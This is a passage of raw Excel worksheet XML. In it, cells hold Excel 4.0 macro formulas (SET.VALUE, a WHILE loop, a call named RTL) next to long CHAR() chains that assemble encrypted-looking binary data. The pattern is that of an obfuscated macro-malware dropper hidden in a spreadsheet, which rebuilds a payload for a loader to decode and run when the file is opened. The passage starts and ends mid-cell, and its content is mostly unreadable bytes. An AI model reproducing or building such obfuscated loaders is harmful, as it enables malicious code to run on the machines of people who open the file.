5)&amp;CHAR(153)&amp;CHAR(125)&amp;CHAR(50)&amp;CHAR(83)&amp;CHAR(216)&amp;CHAR(78)&amp;CHAR(81)&amp;CHAR(254)&amp;CHAR(5)&amp;CHAR(101)&amp;CHAR(126)&amp;CHAR(232)&amp;CHAR(216)&amp;CHAR(179)&amp;CHAR(2)&amp;CHAR(74)&amp;CHAR(188)&amp;CHAR(150)&amp;CHAR(49)&amp;CHAR(4)&amp;CHAR(152)&amp;CHAR(88)&amp;CHAR(234)&amp;CHAR(85)&amp;CHAR(51)&amp;CHAR(14)&amp;CHAR(209)&amp;CHAR(130)&amp;CHAR(22)&amp;CHAR(166)&amp;CHAR(253)&amp;CHAR(205)&amp;CHAR(166)&amp;CHAR(100)&amp;CHAR(168)&amp;CHAR(1)&amp;CHAR(226)&amp;CHAR(24)&amp;CHAR(128)&amp;CHAR(71)&amp;CHAR(234)&amp;CHAR(235)&amp;CHAR(143)&amp;CHAR(96)&amp;CHAR(61)&amp;CHAR(237)&amp;CHAR(100)&amp;CHAR(36)&amp;CHAR(1)&amp;CHAR(147)&amp;CHAR(95)&amp;CHAR(230)&amp;CHAR(93)&amp;CHAR(146)&amp;CHAR(11)&amp;CHAR(91)&amp;CHAR(254)&amp;CHAR(138)&amp;CHAR(214)&amp;CHAR(142)&amp;CHAR(223)&amp;CHAR(116)&amp;CHAR(80)&amp;CHAR(147)&amp;CHAR(4)&amp;CHAR(219)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(121)&amp;CHAR(39)&amp;CHAR(158)&amp;CHAR(108)&amp;CHAR(75)&amp;CHAR(28)&amp;CHAR(236)&amp;CHAR(104)&amp;CHAR(65)&amp;CHAR(110)&amp;CHAR(73)&amp;CHAR(194)&amp;CHAR(123)&amp;CHAR(156)&amp;CHAR(146)&amp;CHAR(79)&amp;CHAR(40)&amp;CHAR(153)&amp;CHAR(238)&amp;CHAR(217)&amp;CHAR(34)&amp;CHAR(212)&amp;CHAR(245)&amp;CHAR(118)&amp;CHAR(186)&amp;CHAR(247)&amp;CHAR(234)&amp;CHAR(189)&amp;CHAR(250)&amp;CHAR(213)&amp;CHAR(15)&amp;CHAR(117)&amp;CHAR(7)&amp;CHAR(100)&amp;CHAR(166)&amp;CHAR(1)&amp;CHAR(251)&amp;CHAR(136)&amp;CHAR(124)&amp;CHAR(99)&amp;CHAR(36)&amp;CHAR(185)&amp;CHAR(6)&amp;CHAR(120)&amp;CHAR(188)&amp;CHAR(89)&amp;CHAR(188)&amp;CHAR(33)&amp;CHAR(93)&amp;CHAR(22)&amp;CHAR(152)&amp;CHAR(17)&amp;CHAR(251)&amp;CHAR(34)&amp;CHAR(195)&amp;CHAR(53)&amp;CHAR(26)&amp;CHAR(189)&amp;CHAR(190)&amp;CHAR(199)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(226)&amp;CHAR(2)&amp;CHAR(64)&amp;CHAR(7)&amp;CHAR(14)&amp;CHAR(115)&amp;CHAR(251)&amp;CHAR(181)&amp;CHAR(17)&amp;CHAR(74)&amp;CHAR(60)&amp;CHAR(107)&amp;CHAR(90)&amp;CHAR(213)&amp;CHAR(221)&amp;CHAR(9)&amp;CHAR(90)&amp;CHAR(108)&amp;CHAR(65)&amp;CHAR(19)&amp;CHAR(98)&amp;CHAR(179)&amp;CHAR(13)&amp;CHAR(230)&amp;CHAR(65)&amp;CHAR(85)&amp;CHAR(179)&amp;CHAR(59)&amp;CHAR(251)&amp;CHAR(202)&amp;CHAR(105)&amp;CHAR(196)&amp;CHAR(116)&amp;CHAR(254)&amp;CHAR(227)&amp;CHAR(145)&amp;CHAR(7)&amp;CHAR(132)&amp;CHAR(93)&amp;CHAR(244)&amp;CHAR(94)&amp;CHAR(246)&amp;CHAR(69)&amp;CHAR(205)&amp;CHAR(226)&amp;CHAR(206)&amp;CHAR(6)&amp;CHAR(189)&amp;CHAR(167)&amp;CHAR(133)&amp;CHAR(246)&amp;CHAR(121)&amp;CHAR(189)&amp;CHAR(200)&amp;CHAR(18)&amp;CHAR(227)&amp;CHAR(87)&amp;CHAR(174)&amp;CHAR(8)&amp;CHAR(149)&amp;CHAR(150)&amp;CHAR(211)</f>
        <v>1Zµõ@d¸é_x0013_Z©«ð3_x0004__x001A_Îæ_x0006_ó¡¾ŸÀÇ†×L-†¦fP¶$5‹–7%¶Ð‚ZìÞã_x001F_»2YO…ŸŽ˜“­»‘™}2SØNQþ_x0005_e~èØ³_x0002_J¼–1_x0004_˜XêU3_x000E_Ñ‚_x0016_¦ýÍ¦d¨_x0001_â_x0018_€Gêë`=íd$_x0001_“_æ]’_x000B_[þŠÖŽßtP“_x0004_Û	_x0007_y'žlK_x001C_ìhAnIÂ{œ’O(™îÙ"Ôõvº÷ê½úÕ_x000F_u_x0007_d¦_x0001_ûˆ|c$¹_x0006_x¼Y¼!]_x0016_˜_x0011_û"Ã5_x001A_½¾Ç_x000F_
â_x0002_@_x0007__x000E_sûµ_x0011_J&lt;kZÕÝ	ZlA_x0013_b³_x000D_æAU³;ûÊiÄtþã‘_x0007_„]ô^öEÍâÎ_x0006_½§…öy½È_x0012_ãW®_x0008_•–Ó</v>
      </c>
      <c r="C30" t="str">
        <f>CHAR(169)&amp;CHAR(251)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(37)&amp;CHAR(240)&amp;CHAR(191)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(152)</f>
        <v>©ûô6%ð¿ë÷˜</v>
      </c>
    </row>
    <row r="31" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A31" t="b">
        <f>SET.VALUE(#REF!,0)</f>
        <v>0</v>
      </c>
      <c r="B31" t="str">
        <f>CHAR(244)&amp;CHAR(6)&amp;CHAR(130)&amp;CHAR(153)&amp;CHAR(211)&amp;CHAR(209)&amp;CHAR(26)&amp;CHAR(246)&amp;CHAR(139)&amp;CHAR(136)&amp;CHAR(79)&amp;CHAR(15)&amp;CHAR(140)&amp;CHAR(13)&amp;CHAR(38)&amp;CHAR(186)&amp;CHAR(9)&amp;CHAR(1)&amp;CHAR(46)&amp;CHAR(208)&amp;CHAR(207)&amp;CHAR(29)&amp;CHAR(180)&amp;CHAR(35)&amp;CHAR(185)&amp;CHAR(177)&amp;CHAR(203)&amp;CHAR(174)&amp;CHAR(46)&amp;CHAR(218)&amp;CHAR(169)&amp;CHAR(8)&amp;CHAR(198)&amp;CHAR(7)&amp;CHAR(62)&amp;CHAR(117)&amp;CHAR(41)&amp;CHAR(184)&amp;CHAR(249)&amp;CHAR(196)&amp;CHAR(166)&amp;CHAR(2)&amp;CHAR(192)&amp;CHAR(44)&amp;CHAR(148)&amp;CHAR(232)&amp;CHAR(222)&amp;CHAR(46)&amp;CHAR(243)&amp;CHAR(248)&amp;CHAR(225)&amp;CHAR(175)&amp;CHAR(51)&amp;CHAR(202)&amp;CHAR(253)&amp;CHAR(255)&amp;CHAR(3)&amp;CHAR(89)&amp;CHAR(98)&amp;CHAR(162)&amp;CHAR(78)&amp;CHAR(84)&amp;CHAR(181)&amp;CHAR(144)&amp;CHAR(231)&amp;CHAR(88)&amp;CHAR(238)&amp;CHAR(56)&amp;CHAR(11)&amp;CHAR(222)&amp;CHAR(24)&amp;CHAR(22)&amp;CHAR(100)&amp;CHAR(169)&amp;CHAR(61)&amp;CHAR(54)&amp;CHAR(137)&amp;CHAR(73)&amp;CHAR(33)&amp;CHAR(150)&amp;CHAR(153)&amp;CHAR(121)&amp;CHAR(230)&amp;CHAR(67)&amp;CHAR(6)&amp;CHAR(99)&amp;CHAR(135)&amp;CHAR(114)&amp;CHAR(42)&amp;CHAR(112)&amp;CHAR(193)&amp;CHAR(200)&amp;CHAR(130)&amp;CHAR(236)&amp;CHAR(213)&amp;CHAR(165)&amp;CHAR(90)&amp;CHAR(199)&amp;CHAR(120)&amp;CHAR(93)&amp;CHAR(91)&amp;CHAR(48)&amp;CHAR(65)&amp;CHAR(250)&amp;CHAR(244)&amp;CHAR(246)&amp;CHAR(43)&amp;CHAR(244)&amp;CHAR(28)&amp;CHAR(240)&amp;CHAR(252)&amp;CHAR(250)&amp;CHAR(161)&amp;CHAR(130)&amp;CHAR(76)&amp;CHAR(48)&amp;CHAR(251)&amp;CHAR(48)&amp;CHAR(107)&amp;CHAR(162)&amp;CHAR(176)&amp;CHAR(18)&amp;CHAR(203)&amp;CHAR(201)&amp;CHAR(1)&amp;CHAR(71)&amp;CHAR(90)&amp;CHAR(177)&amp;CHAR(241)&amp;CHAR(72)&amp;CHAR(7)&amp;CHAR(100)&amp;CHAR(15)&amp;CHAR(123)&amp;CHAR(226)&amp;CHAR(198)&amp;CHAR(73)&amp;CHAR(145)&amp;CHAR(85)&amp;CHAR(131)&amp;CHAR(36)&amp;CHAR(150)&amp;CHAR(153)&amp;CHAR(169)&amp;CHAR(16)&amp;CHAR(198)&amp;CHAR(120)&amp;CHAR(178)&amp;CHAR(1)&amp;CHAR(105)&amp;CHAR(86)&amp;CHAR(222)&amp;CHAR(75)&amp;CHAR(35)&amp;CHAR(147)&amp;CHAR(200)&amp;CHAR(223)&amp;CHAR(192)&amp;CHAR(149)&amp;CHAR(218)&amp;CHAR(149)&amp;CHAR(220)&amp;CHAR(7)&amp;CHAR(254)&amp;CHAR(212)&amp;CHAR(54)&amp;CHAR(219)&amp;CHAR(80)&amp;CHAR(17)&amp;CHAR(78)&amp;CHAR(140)&amp;CHAR(210)&amp;CHAR(170)&amp;CHAR(101)&amp;CHAR(40)&amp;CHAR(35)&amp;CHAR(211)&amp;CHAR(191)&amp;CHAR(22)&amp;CHAR(233)&amp;CHAR(92)&amp;CHAR(176)&amp;CHAR(79)&amp;CHAR(233)&amp;CHAR(10)&amp;CHAR(26)&amp;CHAR(194)&amp;CHAR(154)&amp;CHAR(105)&amp;CHAR(168)&amp;CHAR(41)&amp;CHAR(50)&amp;CHAR(57)&amp;CHAR(31)&amp;CHAR(195)&amp;CHAR(27)&amp;CHAR(11)&amp;CHAR(66)&amp;CHAR(69)&amp;CHAR(159)&amp;CHAR(40)&amp;CHAR(18)&amp;CHAR(141)&amp;CHAR(215)&amp;CHAR(144)&amp;CHAR(9)&amp;CHAR(110)&amp;CHAR(64)&amp;CHAR(239)&amp;CHAR(95)&amp;CHAR(72)&amp;CHAR(23)&amp;CHAR(42)&amp;CHAR(81)&amp;CHAR(120)&amp;CHAR(27)&amp;CHAR(65)&amp;CHAR(62)&amp;CHAR(159)&amp;CHAR(197)&amp;CHAR(70)&amp;CHAR(141)&amp;CHAR(85)&amp;CHAR(179)&amp;CHAR(73)&amp;CHAR(91)&amp;CHAR(59)&amp;CHAR(2)&amp;CHAR(130)&amp;CHAR(21)&amp;CHAR(211)&amp;CHAR(35)&amp;CHAR(199)&amp;CHAR(148)&amp;CHAR(66)&amp;CHAR(55)&amp;CHAR(107)&amp;CHAR(216)&amp;CHAR(8)&amp;CHAR(126)&amp;CHAR(206)&amp;CHAR(101)&amp;CHAR(103)&amp;CHAR(76)&amp;CHAR(83)&amp;CHAR(81)&amp;CHAR(230)&amp;CHAR(175)&amp;CHAR(49)&amp;CHAR(18)&amp;CHAR(36)&amp;CHAR(244)&amp;CHAR(227)&amp;CHAR(51)&amp;CHAR(123)</f>
        <v>ô_x0006_‚™ÓÑ_x001A_ö‹ˆO_x000F_Œ_x000D_&amp;º	_x0001_.ÐÏ_x001D_´#¹±Ë®.Ú©_x0008_Æ_x0007_&gt;u)¸ùÄ¦_x0002_À,”èÞ.óøá¯3Êýÿ_x0003_Yb¢NTµçXî8_x000B_Þ_x0018__x0016_d©=6‰I!–™yæC_x0006_c‡r*pÁÈ‚ìÕ¥ZÇx][0Aúôö+ô_x001C_ðüú¡‚L0û0k¢°_x0012_ËÉ_x0001_GZ±ñH_x0007_d_x000F_{âÆI‘Uƒ$–™©_x0010_Æx²_x0001_iVÞK#“ÈßÀ•Ú•Ü_x0007_þÔ6ÛP_x0011_NŒÒªe(#Ó¿_x0016_é\°Oé
_x001A_Âši¨)29_x001F_Ã_x001B__x000B_BEŸ(_x0012_×	n@ï_H_x0017_*Qx_x001B_A&gt;ŸÅFU³I[;_x0002_‚_x0015_Ó#Ç”B7kØ_x0008_~ÎegLSQæ¯1_x0012_$ôã3{</v>
      </c>
      <c r="C31" t="str">
        <f>CHAR(188)&amp;CHAR(189)&amp;CHAR(249)&amp;CHAR(206)&amp;CHAR(147)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(188)&amp;CHAR(181)</f>
        <v>¼½ùÎ“ë÷ý¼µ</v>
      </c>
    </row>
    <row r="32" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A32" t="b">
        <f>WHILE(main&lt;&gt;"EXCEL")</f>
        <v>0</v>
      </c>
      <c r="B32" t="str">
        <f>CHAR(40)&amp;CHAR(67)&amp;CHAR(9)&amp;CHAR(139)&amp;CHAR(155)&amp;CHAR(42)&amp;CHAR(133)&amp;CHAR(142)&amp;CHAR(6)&amp;CHAR(41)&amp;CHAR(144)&amp;CHAR(140)&amp;CHAR(55)&amp;CHAR(29)&amp;CHAR(40)&amp;CHAR(162)&amp;CHAR(88)&amp;CHAR(117)&amp;CHAR(183)&amp;CHAR(41)&amp;CHAR(217)&amp;CHAR(61)&amp;CHAR(140)&amp;CHAR(148)&amp;CHAR(248)&amp;CHAR(148)&amp;CHAR(93)&amp;CHAR(168)&amp;CHAR(149)&amp;CHAR(89)&amp;CHAR(201)&amp;CHAR(177)&amp;CHAR(98)&amp;CHAR(183)&amp;CHAR(170)&amp;CHAR(186)&amp;CHAR(184)&amp;CHAR(129)&amp;CHAR(28)&amp;CHAR(1)&amp;CHAR(111)&amp;CHAR(246)&amp;CHAR(81)&amp;CHAR(218)&amp;CHAR(174)&amp;CHAR(250)&amp;CHAR(171)&amp;CHAR(224)&amp;CHAR(163)&amp;CHAR(138)&amp;CHAR(68)&amp;CHAR(52)&amp;CHAR(233)&amp;CHAR(170)&amp;CHAR(28)&amp;CHAR(43)&amp;CHAR(174)&amp;CHAR(147)&amp;CHAR(88)&amp;CHAR(62)&amp;CHAR(150)&amp;CHAR(151)&amp;CHAR(235)&amp;CHAR(135)&amp;CHAR(191)&amp;CHAR(253)&amp;CHAR(111)&amp;CHAR(220)&amp;CHAR(135)&amp;CHAR(46)&amp;CHAR(177)&amp;CHAR(224)&amp;CHAR(216)&amp;CHAR(72)&amp;CHAR(208)&amp;CHAR(152)&amp;CHAR(228)&amp;CHAR(187)&amp;CHAR(128)&amp;CHAR(228)&amp;CHAR(185)&amp;CHAR(215)&amp;CHAR(248)&amp;CHAR(206)&amp;CHAR(126)&amp;CHAR(189)&amp;CHAR(128)&amp;CHAR(184)&amp;CHAR(25)&amp;CHAR(200)&amp;CHAR(69)&amp;CHAR(68)&amp;CHAR(243)&amp;CHAR(76)&amp;CHAR(3)&amp;CHAR(125)&amp;CHAR(245)&amp;CHAR(210)&amp;CHAR(113)&amp;CHAR(34)&amp;CHAR(197)&amp;CHAR(3)&amp;CHAR(254)&amp;CHAR(59)&amp;CHAR(130)&amp;CHAR(201)&amp;CHAR(91)&amp;CHAR(109)&amp;CHAR(251)&amp;CHAR(247)&amp;CHAR(15)&amp;CHAR(40)&amp;CHAR(183)&amp;CHAR(204)&amp;CHAR(104)&amp;CHAR(195)&amp;CHAR(241)&amp;CHAR(84)&amp;CHAR(145)&amp;CHAR(139)&amp;CHAR(195)&amp;CHAR(125)&amp;CHAR(27)&amp;CHAR(242)&amp;CHAR(129)&amp;CHAR(81)&amp;CHAR(209)&amp;CHAR(253)&amp;CHAR(57)&amp;CHAR(28)&amp;CHAR(113)&amp;CHAR(171)&amp;CHAR(209)&amp;CHAR(1)&amp;CHAR(67)&amp;CHAR(165)&amp;CHAR(213)&amp;CHAR(178)&amp;CHAR(190)&amp;CHAR(145)&amp;CHAR(244)&amp;CHAR(8)&amp;CHAR(181)&amp;CHAR(48)&amp;CHAR(241)&amp;CHAR(43)&amp;CHAR(231)&amp;CHAR(61)&amp;CHAR(29)&amp;CHAR(184)&amp;CHAR(96)&amp;CHAR(201)&amp;CHAR(167)&amp;CHAR(229)&amp;CHAR(16)&amp;CHAR(26)&amp;CHAR(136)&amp;CHAR(45)&amp;CHAR(43)&amp;CHAR(238)&amp;CHAR(18)&amp;CHAR(143)&amp;CHAR(170)&amp;CHAR(197)&amp;CHAR(9)&amp;CHAR(171)&amp;CHAR(249)&amp;CHAR(76)&amp;CHAR(138)&amp;CHAR(179)&amp;CHAR(231)&amp;CHAR(108)&amp;CHAR(140)&amp;CHAR(236)&amp;CHAR(183)&amp;CHAR(221)&amp;CHAR(249)&amp;CHAR(242)&amp;CHAR(13)&amp;CHAR(96)&amp;CHAR(71)&amp;CHAR(254)&amp;CHAR(216)&amp;CHAR(96)&amp;CHAR(249)&amp;CHAR(252)&amp;CHAR(184)&amp;CHAR(2)&amp;CHAR(227)&amp;CHAR(18)&amp;CHAR(164)&amp;CHAR(130)&amp;CHAR(125)&amp;CHAR(223)&amp;CHAR(204)&amp;CHAR(203)&amp;CHAR(112)&amp;CHAR(62)&amp;CHAR(27)&amp;CHAR(253)&amp;CHAR(57)&amp;CHAR(239)&amp;CHAR(51)&amp;CHAR(200)&amp;CHAR(84)&amp;CHAR(214)&amp;CHAR(118)&amp;CHAR(113)&amp;CHAR(215)&amp;CHAR(209)&amp;CHAR(145)&amp;CHAR(40)&amp;CHAR(191)&amp;CHAR(145)&amp;CHAR(92)&amp;CHAR(240)&amp;CHAR(155)&amp;CHAR(167)&amp;CHAR(172)&amp;CHAR(106)&amp;CHAR(28)&amp;CHAR(100)&amp;CHAR(45)&amp;CHAR(101)&amp;CHAR(226)&amp;CHAR(35)&amp;CHAR(219)&amp;CHAR(179)&amp;CHAR(96)&amp;CHAR(6)&amp;CHAR(6)&amp;CHAR(86)&amp;CHAR(251)&amp;CHAR(194)&amp;CHAR(46)&amp;CHAR(143)&amp;CHAR(163)&amp;CHAR(57)&amp;CHAR(129)&amp;CHAR(64)&amp;CHAR(151)&amp;CHAR(33)&amp;CHAR(171)&amp;CHAR(79)&amp;CHAR(159)&amp;CHAR(123)&amp;CHAR(14)&amp;CHAR(62)&amp;CHAR(194)&amp;CHAR(81)&amp;CHAR(143)&amp;CHAR(135)&amp;CHAR(165)&amp;CHAR(2)&amp;CHAR(185)</f>
        <v>(C	‹›*…Ž_x0006_)Œ7_x001D_(¢Xu·)Ù=Œ”ø”]¨•YÉ±b·ªº¸_x001C__x0001_oöQÚ®ú«à£ŠD4éª_x001C_+®“X&gt;–—ë‡¿ýoÜ‡.±àØHÐ˜ä»€ä¹×øÎ~½€¸_x0019_ÈEDóL_x0003_}õÒq"Å_x0003_þ;‚É[mû÷_x000F_(·ÌhÃñT‘‹Ã}_x001B_òQÑý9_x001C_q«Ñ_x0001_C¥Õ²¾‘ô_x0008_µ0ñ+ç=_x001D_¸`É§å_x0010__x001A_ˆ-+î_x0012_ªÅ	«ùLŠ³çlŒì·Ýùò_x000D_`GþØ`ùü¸_x0002_ã_x0012_¤‚}ßÌËp&gt;_x001B_ý9ï3ÈTÖvq×Ñ‘(¿‘\ð›§¬j_x001C_d-eâ#Û³`_x0006__x0006_VûÂ.£9@—!«OŸ{_x000E_&gt;ÂQ‡¥_x0002_¹</v>
      </c>
      <c r="C32" t="str">
        <f>CHAR(11)&amp;CHAR(211)&amp;CHAR(242)&amp;CHAR(98)&amp;CHAR(7)&amp;CHAR(181)&amp;CHAR(121)&amp;CHAR(35)&amp;CHAR(184)&amp;CHAR(237)</f>
        <v>_x000B_Óòb_x0007_µy#¸í</v>
      </c>
    </row>
    <row r="33" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A33" t="b">
        <f>SET.VALUE(D1,LEN(main))</f>
        <v>0</v>
      </c>
      <c r="B33" t="str">
        <f>CHAR(123)&amp;CHAR(198)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(66)&amp;CHAR(8)&amp;CHAR(43)&amp;CHAR(23)&amp;CHAR(107)&amp;CHAR(130)&amp;CHAR(246)&amp;CHAR(180)&amp;CHAR(2)&amp;CHAR(1)&amp;CHAR(224)&amp;CHAR(100)&amp;CHAR(6)&amp;CHAR(48)&amp;CHAR(156)&amp;CHAR(186)&amp;CHAR(160)&amp;CHAR(55)&amp;CHAR(141)&amp;CHAR(184)&amp;CHAR(29)&amp;CHAR(135)&amp;CHAR(246)&amp;CHAR(115)&amp;CHAR(186)&amp;CHAR(85)&amp;CHAR(190)&amp;CHAR(123)&amp;CHAR(2)&amp;CHAR(243)&amp;CHAR(49)&amp;CHAR(147)&amp;CHAR(53)&amp;CHAR(9)&amp;CHAR(182)&amp;CHAR(68)&amp;CHAR(184)&amp;CHAR(158)&amp;CHAR(86)&amp;CHAR(5)&amp;CHAR(233)&amp;CHAR(121)&amp;CHAR(13)&amp;CHAR(133)&amp;CHAR(251)&amp;CHAR(227)&amp;CHAR(192)&amp;CHAR(243)&amp;CHAR(164)&amp;CHAR(223)&amp;CHAR(182)&amp;CHAR(119)&amp;CHAR(22)&amp;CHAR(22)&amp;CHAR(20)&amp;CHAR(12)&amp;CHAR(50)&amp;CHAR(70)&amp;CHAR(70)&amp;CHAR(194)&amp;CHAR(132)&amp;CHAR(163)&amp;CHAR(184)&amp;CHAR(222)&amp;CHAR(72)&amp;CHAR(237)&amp;CHAR(63)&amp;CHAR(224)&amp;CHAR(205)&amp;CHAR(138)&amp;CHAR(28)&amp;CHAR(212)&amp;CHAR(51)&amp;CHAR(102)&amp;CHAR(173)&amp;CHAR(11)&amp;CHAR(71)&amp;CHAR(233)&amp;CHAR(91)&amp;CHAR(26)&amp;CHAR(137)&amp;CHAR(32)&amp;CHAR(80)&amp;CHAR(157)&amp;CHAR(195)&amp;CHAR(55)&amp;CHAR(219)&amp;CHAR(76)&amp;CHAR(248)&amp;CHAR(78)&amp;CHAR(177)&amp;CHAR(75)&amp;CHAR(31)&amp;CHAR(250)&amp;CHAR(72)&amp;CHAR(58)&amp;CHAR(147)&amp;CHAR(161)&amp;CHAR(107)&amp;CHAR(158)&amp;CHAR(100)&amp;CHAR(27)&amp;CHAR(76)&amp;CHAR(199)&amp;CHAR(138)&amp;CHAR(248)&amp;CHAR(23)&amp;CHAR(225)&amp;CHAR(132)&amp;CHAR(168)&amp;CHAR(220)&amp;CHAR(8)&amp;CHAR(10)&amp;CHAR(135)&amp;CHAR(213)&amp;CHAR(118)&amp;CHAR(166)&amp;CHAR(84)&amp;CHAR(112)&amp;CHAR(216)&amp;CHAR(76)&amp;CHAR(174)&amp;CHAR(222)&amp;CHAR(169)&amp;CHAR(122)&amp;CHAR(103)&amp;CHAR(95)&amp;CHAR(162)&amp;CHAR(37)&amp;CHAR(120)&amp;CHAR(211)&amp;CHAR(69)&amp;CHAR(84)&amp;CHAR(216)&amp;CHAR(160)&amp;CHAR(127)&amp;CHAR(115)&amp;CHAR(179)&amp;CHAR(18)&amp;CHAR(107)&amp;CHAR(141)&amp;CHAR(39)&amp;CHAR(189)&amp;CHAR(10)&amp;CHAR(168)&amp;CHAR(151)&amp;CHAR(128)&amp;CHAR(220)&amp;CHAR(64)&amp;CHAR(25)&amp;CHAR(120)&amp;CHAR(245)&amp;CHAR(104)&amp;CHAR(188)&amp;CHAR(10)&amp;CHAR(214)&amp;CHAR(50)&amp;CHAR(183)&amp;CHAR(138)&amp;CHAR(13)&amp;CHAR(168)&amp;CHAR(11)&amp;CHAR(241)&amp;CHAR(29)&amp;CHAR(209)&amp;CHAR(164)&amp;CHAR(60)&amp;CHAR(198)&amp;CHAR(80)&amp;CHAR(115)&amp;CHAR(139)&amp;CHAR(150)&amp;CHAR(220)&amp;CHAR(151)&amp;CHAR(205)&amp;CHAR(119)&amp;CHAR(163)&amp;CHAR(197)&amp;CHAR(113)&amp;CHAR(93)&amp;CHAR(206)&amp;CHAR(101)&amp;CHAR(39)&amp;CHAR(142)&amp;CHAR(187)&amp;CHAR(53)&amp;CHAR(128)&amp;CHAR(23)&amp;CHAR(243)&amp;CHAR(158)&amp;CHAR(247)&amp;CHAR(242)&amp;CHAR(220)&amp;CHAR(42)&amp;CHAR(48)&amp;CHAR(232)&amp;CHAR(91)&amp;CHAR(197)&amp;CHAR(220)&amp;CHAR(193)&amp;CHAR(136)&amp;CHAR(207)&amp;CHAR(84)&amp;CHAR(45)&amp;CHAR(157)&amp;CHAR(123)&amp;CHAR(150)&amp;CHAR(157)&amp;CHAR(52)&amp;CHAR(135)&amp;CHAR(31)&amp;CHAR(141)&amp;CHAR(172)&amp;CHAR(159)&amp;CHAR(159)&amp;CHAR(76)&amp;CHAR(73)&amp;CHAR(168)&amp;CHAR(92)&amp;CHAR(60)&amp;CHAR(59)&amp;CHAR(81)&amp;CHAR(13)&amp;CHAR(167)&amp;CHAR(184)&amp;CHAR(35)&amp;CHAR(245)&amp;CHAR(131)&amp;CHAR(87)&amp;CHAR(237)&amp;CHAR(47)&amp;CHAR(194)&amp;CHAR(244)&amp;CHAR(65)&amp;CHAR(28)&amp;CHAR(152)&amp;CHAR(113)&amp;CHAR(151)&amp;CHAR(206)&amp;CHAR(240)&amp;CHAR(160)&amp;CHAR(96)&amp;CHAR(76)&amp;CHAR(35)&amp;CHAR(227)&amp;CHAR(165)&amp;CHAR(107)&amp;CHAR(55)&amp;CHAR(143)&amp;CHAR(156)&amp;CHAR(149)</f>
        <v>{ÆÍëB_x0008_+_x0017_k‚ö´_x0002__x0001_àd_x0006_0œº 7¸_x001D_‡ösºU¾{_x0002_ó1“5	¶D¸žV_x0005_éy_x000D_…ûãÀó¤ß¶w_x0016__x0016__x0014__x000C_2FFÂ„£¸ÞHí?àÍŠ_x001C_Ô3f­_x000B_Gé[_x001A_‰ PÃ7ÛLøN±K_x001F_úH:“¡kžd_x001B_LÇŠø_x0017_á„¨Ü_x0008_
‡Õv¦TpØL®Þ©zg_¢%xÓETØ s³_x0012_k'½
¨—€Ü@_x0019_xõh¼
Ö2·Š_x000D_¨_x000B_ñ_x001D_Ñ¤&lt;ÆPs‹–Ü—Íw£Åq]Îe'Ž»5€_x0017_óž÷òÜ*0è[ÅÜÁˆÏT-{–4‡_x001F_¬ŸŸLI¨\&lt;;Q_x000D_§¸#õƒWí/ÂôA_x001C_˜q—Îð `L#ã¥k7œ•</v>
      </c>
      <c r="C33" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(191)&amp;CHAR(112)&amp;CHAR(249)&amp;CHAR(13)&amp;CHAR(203)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(3)</f>
        <v>»ë¿pù_x000D_Ëë»_x0003_</v>
      </c>
    </row>
    <row r="34" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A34" t="e">
        <f>RTL(A21+(#REF!*10),main,LEN(main))</f>
        <v>#NAME?</v>
      </c>
      <c r="B34" t="str">
        <f>CHAR(141)&amp;CHAR(207)&amp;CHAR(184)&amp;CHAR(74)&amp;CHAR(171)&amp;CHAR(92)&amp;CHAR(200)&amp;CHAR(57)&amp;CHAR(79)&amp;CHAR(232)&amp;CHAR(217)&amp;CHAR(207)&amp;CHAR(112)&amp;CHAR(61)&amp;CHAR(85)&amp;CHAR(99)&amp;CHAR(189)&amp;CHAR(130)&amp;CHAR(207)&amp;CHAR(226)&amp;CHAR(85)&amp;CHAR(28)&amp;CHAR(16)&amp;CHAR(46)&amp;CHAR(21)&amp;CHAR(223)&amp;CHAR(118)&amp;CHAR(38)&amp;CHAR(66)&amp;CHAR(66)&amp;CHAR(143)&amp;CHAR(78)&amp;CHAR(177)&amp;CHAR(197)&amp;CHAR(44)&amp;CHAR(236)&amp;CHAR(42)&amp;CHAR(92)&amp;CHAR(110)&amp;CHAR(233)&amp;CHAR(84)&amp;CHAR(159)&amp;CHAR(230)&amp;CHAR(25)&amp;CHAR(150)&amp;CHAR(251)&amp;CHAR(57)&amp;CHAR(184)&amp;CHAR(134)&amp;CHAR(69)&amp;CHAR(176)&amp;CHAR(88)&amp;CHAR(129)&amp;CHAR(142)&amp;CHAR(7)&amp;CHAR(211)&amp;CHAR(243)&amp;CHAR(81)&amp;CHAR(141)&amp;CHAR(9)&amp;CHAR(96)&amp;CHAR(194)&amp;CHAR(128)&amp;CHAR(59)&amp;CHAR(161)&amp;CHAR(204)&amp;CHAR(199)&amp;CHAR(93)&amp;CHAR(151)&amp;CHAR(244)&amp;CHAR(221)&amp;CHAR(129)&amp;CHAR(116)&amp;CHAR(152)&amp;CHAR(144)&amp;CHAR(26)&amp;CHAR(146)&amp;CHAR(17)&amp;CHAR(226)&amp;CHAR(238)&amp;CHAR(6)&amp;CHAR(190)&amp;CHAR(184)&amp;CHAR(186)&amp;CHAR(156)&amp;CHAR(72)&amp;CHAR(48)&amp;CHAR(209)&amp;CHAR(128)&amp;CHAR(4)&amp;CHAR(84)&amp;CHAR(12)&amp;CHAR(143)&amp;CHAR(170)&amp;CHAR(164)&amp;CHAR(6)&amp;CHAR(53)&amp;CHAR(24)&amp;CHAR(82)&amp;CHAR(74)&amp;CHAR(129)&amp;CHAR(136)&amp;CHAR(179)&amp;CHAR(169)&amp;CHAR(89)&amp;CHAR(254)&amp;CHAR(113)&amp;CHAR(231)&amp;CHAR(148)&amp;CHAR(27)&amp;CHAR(212)&amp;CHAR(111)&amp;CHAR(249)&amp;CHAR(166)&amp;CHAR(248)&amp;CHAR(63)&amp;CHAR(73)&amp;CHAR(150)&amp;CHAR(211)&amp;CHAR(74)&amp;CHAR(85)&amp;CHAR(81)&amp;CHAR(197)&amp;CHAR(52)&amp;CHAR(222)&amp;CHAR(215)&amp;CHAR(35)&amp;CHAR(3)&amp;CHAR(101)&amp;CHAR(65)&amp;CHAR(242)